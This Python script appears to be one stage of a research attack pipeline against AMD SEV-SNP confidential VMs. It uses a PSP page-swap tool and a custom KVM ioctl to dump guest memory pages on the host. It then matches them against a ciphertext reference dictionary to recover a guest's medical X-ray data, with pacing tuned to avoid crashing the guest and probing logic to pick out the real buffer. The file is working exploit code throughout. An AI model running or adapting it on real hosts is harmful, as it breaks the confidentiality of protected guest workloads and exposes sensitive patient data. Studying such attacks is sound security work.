#!/usr/bin/env python3
"""
stage3_swap_dump.py — Stage 3: PSP 49-Page Sequential Collision Swap & Dump.

Loads tracked 49-page GPAs from Stage 2 and FIXED_GPA from Stage 1.
Sequentially collides and dumps each of the 49 pages against FIXED_GPA using
swap_pages_tool with --swap-back safety to preserve guest VM integrity.

Outputs:
  - {class}_{index}_p{00..48}.out (dump files)
  - swap_meta_{index}.json (swap execution metadata)

Usage:
    sudo python3 stage3_swap_dump.py --index 0 [--output-dir .]
"""

import argparse
import ctypes
import fcntl
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c

_KVMIO = 0xAE
KVM_READ_PAGE_DUMP = (0x80000000 | ((c.PAGE_SIZE & 0x3FFF) << 16) | (_KVMIO << 8) | 0x2b)

# PSP command-rate pacing for SEV-SNP stability:
# PSP firmware resets/reboots if sustained commands exceed ~60 cmd/sec.
# Each swap-back executes ~12 PSP commands.
# 0.25s pacing -> ~48 cmds/sec max.
# Every 10 swaps, mandatory 2.0s burst cooldown to allow PSP queue to drain.
# Raised from 0.25/2.0 after the guest consistently died around 1,700 swaps
# (~13 samples): index 0-12 captured 49/49, then 13 degraded and 14-16 returned
# nothing. Overridable so pacing can be tuned without editing this file.
SWAP_PACE_SEC       = float(os.environ.get("MURA_SWAP_PACE", "0.8"))
SWAP_BURST_COOLDOWN = int(os.environ.get("MURA_SWAP_BURST_EVERY", "8"))
SWAP_BURST_SLEEP    = float(os.environ.get("MURA_SWAP_BURST_SLEEP", "5.0"))


def _bytes_to_xp(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, c.PAGE_SIZE, 16):
        lo = int.from_bytes(raw[i:i+8], "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{gpa+i:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(dict_gpa: int, src_gpa: int, out_path: Path,
                 swap_tool: Path = c.SWAP_TOOL_PATH,
                 kvm_dev: str = "/dev/kvm") -> bool:
    """Perform PSP swap-back and read kernel dump to output file."""
    cmd = [str(swap_tool), f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"]
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        print(f"[stage3] [!] swap_pages_tool failed (exit {rc}) for GPA 0x{src_gpa:x}", file=sys.stderr)
        return False

    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(c.PAGE_SIZE)
        # The dump buffer is not always ready the instant the swap reports done;
        # the ioctl then returns EAGAIN. Retrying costs milliseconds, while letting
        # it propagate throws away the whole dictionary build (seen at ref 20/64).
        for attempt in range(8):
            try:
                fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
                break
            except BlockingIOError:
                if attempt == 7:
                    raise
                time.sleep(0.25 * (attempt + 1))
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(_bytes_to_xp(dict_gpa, raw) + "\n")
    return True


PROBE_PAGES = 8
# A real channel page hits the dictionary only if the image happens to hold one of
# the reference values there, so demanding all 8 needs a dense dictionary. Measured
# over the validation cache: 12 greedily-chosen refs pass 3-of-8 on 95.7% of images,
# beating 64 refs at 8-of-8 (87.1%) with a fifth of the build cost. Decoys scored
# 0-2 of 8 in the A/B runs, so 3 still separates them.
PROBE_MIN_COVERED = 3


def _pace(k: int):
    """PSP command-rate pacing shared by probe and full dump."""
    if k <= 0:
        return
    if SWAP_BURST_COOLDOWN > 0 and k % SWAP_BURST_COOLDOWN == 0:
        time.sleep(SWAP_BURST_SLEEP)
    elif SWAP_PACE_SEC > 0:
        time.sleep(SWAP_PACE_SEC)


def probe_select_candidate(index: int, output_dir: Path, fixed_gpa: int,
                           candidates: List[Dict], probe_pages: int = PROBE_PAGES):
    """Pick the real channel buffer by asking the reference dictionary.

    Write-pattern shape alone cannot separate the tensor burst from look-alike
    bursts — every shape rule tried ranks some decoy first — but the dumped bytes
    can. What separates them is coverage, not volume: measured over six A/B pairs,
    every page of the real channel collides with some reference (48/48 probed
    pages), while a decoy leaves most pages at zero (0-2 of 8). Totals do not
    separate them, because uniform guest memory can collide far more often than
    an X-ray does.

    Probing stops at a candidate's first empty page, so decoys cost one or two
    swaps instead of a full 49-page dump of the wrong buffer.
    """
    import stage4_extract_features as s4

    ref_patterns = s4.load_ref_dictionary_patterns()
    probe_dir = output_dir / f"probe_{index}"
    probe_dir.mkdir(parents=True, exist_ok=True)

    scores: List[Dict] = []
    swaps = 0
    for ci, cand in enumerate(candidates):
        pages = cand.get("channel_pages_int", [])
        if not pages:
            scores.append({"covered": 0, "probed": 0, "total": 0})
            continue
        step = max(1, len(pages) // probe_pages)
        picks = pages[::step][:probe_pages]
        covered = total = misses = 0
        for pi, gpa in enumerate(picks):
            _pace(swaps)
            swaps += 1
            out = probe_dir / f"c{ci:02d}_p{pi}.out"
            n = s4.count_page_matches(out, ref_patterns) if do_swap_read(fixed_gpa, gpa, out) else 0
            if n == 0:
                misses += 1
                # Stop once the threshold is out of reach, not on the first empty page.
                if misses > len(picks) - PROBE_MIN_COVERED:
                    break
                continue
            covered += 1
            total += n
        scores.append({"covered": covered, "probed": len(picks), "total": total})
        print(f"  [probe] cand {ci:2d}: {covered}/{len(picks)} page(s) covered, "
              f"{total:6d} matches  runs={cand.get('runs','-')} "
              f"span={cand.get('span_us','-')}us blocks={cand.get('blocks')}")

    best = max(range(len(scores)),
               key=lambda k: (scores[k]["covered"], scores[k]["total"])) if scores else 0
    full = [k for k, s in enumerate(scores) if s["covered"] >= PROBE_MIN_COVERED]
    print(f"[stage3] [probe] selected candidate {best} "
          f"({scores[best]['covered']}/{scores[best]['probed']} covered, "
          f"{scores[best]['total']} matches) after {swaps} swap(s)")
    if len(full) > 1:
        print(f"[stage3] [probe] [!] {len(full)} candidates reached the threshold ({full}) — "
              f"picked on match count, which the A/B data does not validate")
    elif not full:
        print(f"[stage3] [probe] [!] no candidate reached {PROBE_MIN_COVERED}/{PROBE_PAGES} — "
              f"the real buffer may not be among them")
    if scores and not any(s["covered"] for s in scores):
        # Every candidate scoring zero means the dictionary cannot see image data
        # at all — almost always a rebuilt guest whose VEK no longer matches the
        # refs. Selection degenerates to "candidate 0" and every row after this is
        # noise, so say so loudly enough for a batch to stop.
        print(f"[stage3] [probe] [!!] every candidate scored zero — the reference "
              f"dictionary does not match this guest. Rebuild it (stage1 --rebuild).",
              file=sys.stderr)
    return best, scores


def ab_compare_gt(index: int, output_dir: Path, fixed_gpa: int,
                  selected: List[int], gt_pages: List[int], n: int = 8) -> Dict:
    """Score the selected pages against the guest-reported ones, in the same run.

    Probe selection assumes the real buffer collides with the dictionary more than
    a decoy does. The two runs on record say the opposite, so this dumps both page
    sets while the guest still holds them and reports each score, instead of
    trusting either. Diagnostic only — it does not change what Stage 3 dumps.
    """
    import stage4_extract_features as s4

    ref_patterns = s4.load_ref_dictionary_patterns()
    ab_dir = output_dir / f"ab_{index}"
    ab_dir.mkdir(parents=True, exist_ok=True)

    out: Dict = {}
    swaps = 0
    for tag, pages in (("selected", selected), ("gt", gt_pages)):
        if not pages:
            out[tag] = None
            continue
        step = max(1, len(pages) // n)
        picks = pages[::step][:n]
        per = []
        for pi, gpa in enumerate(picks):
            _pace(swaps)
            swaps += 1
            f = ab_dir / f"{tag}_p{pi}.out"
            per.append(s4.count_page_matches(f, ref_patterns)
                       if do_swap_read(fixed_gpa, gpa, f) else 0)
        out[tag] = {"pages_probed": len(picks), "per_page": per, "total": sum(per)}
        print(f"  [ab] {tag:<8}: total={sum(per):6d}  per-page={per}")

    if out.get("selected") and out.get("gt"):
        s, g = out["selected"]["total"], out["gt"]["total"]
        verdict = "GT scores higher" if g > s else ("selected scores higher" if s > g else "tie")
        print(f"[stage3] [ab] {verdict} (selected={s}, gt={g}) over {swaps} swap(s)")
        out["verdict"] = verdict
    return out


SLIDE_MAX_MISS = 3


def refine_window(index: int, output_dir: Path, fixed_gpa: int, cand: Dict,
                  n_pages: int = None):
    """Walk the window back onto the true start of the burst.

    Stage 2's windows land a few writes late — measured slips of -2 to -9 — because
    a repeated page near the burst start makes the first all-distinct window begin
    past it.

    OFF BY DEFAULT: walking back until pages stop hitting the dictionary does not
    work. Unrelated guest memory hits it too, so the walk almost never sees the
    miss that should stop it and runs to the end of the context every time (20 of
    21 samples slid the full 12 pages), which cut recovery from 42-49/49 down to a
    mean of 33/49. A usable rule needs a signal that distinguishes a tensor page
    from a neighbouring page, which per-page match counts do not provide.
    """
    import stage4_extract_features as s4

    n = n_pages or c.IMG_PAGES
    ctx, off = cand.get("ctx", []), cand.get("ctx_off", 0)
    if not ctx or off == 0 or off + n > len(ctx):
        return None, {}

    ref_patterns = s4.load_ref_dictionary_patterns()
    slide_dir = output_dir / f"slide_{index}"
    slide_dir.mkdir(parents=True, exist_ok=True)

    hits: Dict[int, int] = {}
    start, misses, swaps = off, 0, 0
    for i in range(off - 1, -1, -1):
        _pace(swaps)
        swaps += 1
        f = slide_dir / f"c{i:02d}.out"
        n_hit = s4.count_page_matches(f, ref_patterns) if do_swap_read(fixed_gpa, ctx[i], f) else 0
        hits[i] = n_hit
        if n_hit:
            start, misses = i, 0
        else:
            misses += 1
            if misses > SLIDE_MAX_MISS:
                break

    if start + n > len(ctx):
        start = len(ctx) - n
    print(f"[stage3] [slide] window start {off} -> {start} "
          f"({off - start} page(s) earlier) after {swaps} probe(s)")
    return ctx[start:start + n], {"from": off, "to": start, "hits": hits, "swaps": swaps}


def run_stage3(index: int, output_dir: Path, mock: bool = False,
               ab_gt: bool = False, probe: bool = False, slide: bool = False) -> Dict:
    """Execute Stage 3."""
    output_dir.mkdir(parents=True, exist_ok=True)
    c.ensure_guest_suppressions()
    tracked_path = output_dir / f"tracked_mura_{index}.json"
    dict_meta_path = output_dir / "ref_dict.json"
    swap_meta_path = output_dir / f"swap_meta_{index}.json"

    if not tracked_path.exists():
        raise FileNotFoundError(f"Missing {tracked_path} — run Stage 2 first.")

    tracked = c.load_json(tracked_path)
    target_class = tracked.get("target_class", "ELBOW")
    pages = tracked.get("channel_pages_int", [])

    if not dict_meta_path.exists():
        # Fall back to dict_cache_mura.json
        if c.DICT_CACHE_FILE.exists():
            dict_cache = c.load_json(c.DICT_CACHE_FILE)
            fixed_gpa = int(dict_cache.get("fixed_gpa", "0x0"), 16)
        else:
            fixed_gpa = 0x140b3a000
    else:
        dict_meta = c.load_json(dict_meta_path)
        fixed_gpa = int(dict_meta.get("fixed_gpa", "0x0"), 16)

    # Stage 2 cannot tell the real buffer from look-alike bursts; the dictionary can.
    probe_scores: List[int] = []
    probe_choice = None
    slide_meta: Dict = {}
    cand_list = tracked.get("candidates", [])
    if probe and not mock and len(cand_list) > 1:
        print(f"[stage3] Probing {len(cand_list)} candidate(s) x {PROBE_PAGES} page(s)...")
        probe_choice, probe_scores = probe_select_candidate(
            index, output_dir, fixed_gpa, cand_list)
        chosen = cand_list[probe_choice].get("channel_pages_int", [])
        if chosen:
            pages = chosen
        if slide:
            slid, slide_meta = refine_window(index, output_dir, fixed_gpa,
                                             cand_list[probe_choice])
            if slid:
                pages = slid

    ab_result = None
    if ab_gt and not mock:
        gt_pages = tracked.get("gt_pages_int", [])
        if gt_pages:
            print(f"[stage3] [ab] Comparing selected pages against guest-reported GT...")
            ab_result = ab_compare_gt(index, output_dir, fixed_gpa, pages, gt_pages)
        else:
            print(f"[stage3] [ab] Guest reported no GT pages — skipping comparison")

    print(f"[stage3] Target: {target_class} (Index {index}), FIXED_GPA: 0x{fixed_gpa:x}, Pages: {len(pages)}")

    dump_files = []
    successful_pages = 0
    t0 = time.time()

    for k, page_gpa in enumerate(pages):
        out_file = output_dir / f"{target_class}_{index}_p{k:02d}.out"
        if mock:
            # Generate mock dump for testing pipeline without root/PSP
            out_file.write_text(f"(qemu) xp /512gx 0x{fixed_gpa:x}\n{fixed_gpa:016x}: 0x0 0x0\n")
            dump_files.append(str(out_file))
            successful_pages += 1
            continue

        _pace(k)

        ok = do_swap_read(fixed_gpa, page_gpa, out_file)
        if ok:
            dump_files.append(str(out_file))
            successful_pages += 1
            print(f"  [{k+1:2d}/{len(pages)}] Dumped page 0x{page_gpa:x} → {out_file.name}")
        else:
            print(f"  [{k+1:2d}/{len(pages)}] FAILED page 0x{page_gpa:x}")

    # Signal guest that swap-back read is complete so it can safely proceed/exit
    c.ssh_run("touch /tmp/host_read_done")

    elapsed = time.time() - t0
    capture_fraction = successful_pages / c.IMG_PAGES

    gt_all = tracked.get("gt_pages_int", [])
    gt_ov = len(set(gt_all) & set(pages)) if gt_all else None
    gt_ord = sum(1 for a, b in zip(pages, gt_all) if a == b) if gt_all else None
    if gt_all:
        print(f"[stage3] [gt] recovered {gt_ov}/{len(gt_all)} pages "
              f"(order {gt_ord}/{len(gt_all)})")

    meta = {
        "stage": 3,
        "index": index,
        "target_class": target_class,
        "fixed_gpa": hex(fixed_gpa),
        "total_requested_pages": len(pages),
        "successful_pages": successful_pages,
        "capture_fraction": capture_fraction,
        "is_partial": capture_fraction < 1.0,
        "dump_files": dump_files,
        "probe_scores": probe_scores,
        "probe_choice": probe_choice,
        "slide": slide_meta,
        "dict_dead": bool(probe_scores) and not any(s["covered"] for s in probe_scores),
        "dumped_pages_hex": [hex(p) for p in pages],
        # Recovery is judged on what was actually dumped, after probe and slide —
        # Stage 2's own gt_overlap predates both and understates the result.
        "gt_overlap": gt_ov,
        "gt_exact_order": gt_ord,
        "gt_pages": len(gt_all),
        # Dumps are only interpretable with the dictionary from the same VM boot,
        # because the VEK changes with the instance. Record which one this is so a
        # dataset build can pair each sample with the right reference snapshot.
        "boot_id": os.environ.get("MURA_BOOT_ID", ""),
        "ab_gt": ab_result,
        "elapsed_sec": round(elapsed, 2),
        "timestamp": time.time(),
    }
    c.save_json(swap_meta_path, meta)
    print(f"[stage3] Completed 49-page swap dump in {elapsed:.1f}s (Frac: {capture_fraction:.3f}) → {swap_meta_path}")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=0, help="MURA study / sample index")
    p.add_argument("--mock", action="store_true", help="Generate synthetic dumps without PSP swap (testing)")
    p.add_argument("--probe", action="store_true",
                   help="Pick among Stage 2 candidates by dictionary matches (UNVALIDATED)")
    p.add_argument("--slide", action="store_true",
                   help="Walk the window back onto the burst start (REGRESSES recovery)")
    p.add_argument("--ab-gt", action="store_true",
                   help="Also dump the guest-reported GT pages and compare match scores")
    p.add_argument("--output-dir", default=str(HERE), help="Directory to save dumps and metadata")
    args = p.parse_args()

    run_stage3(args.index, Path(args.output_dir), mock=args.mock,
               ab_gt=args.ab_gt, probe=args.probe, slide=args.slide)


if __name__ == "__main__":
    main()
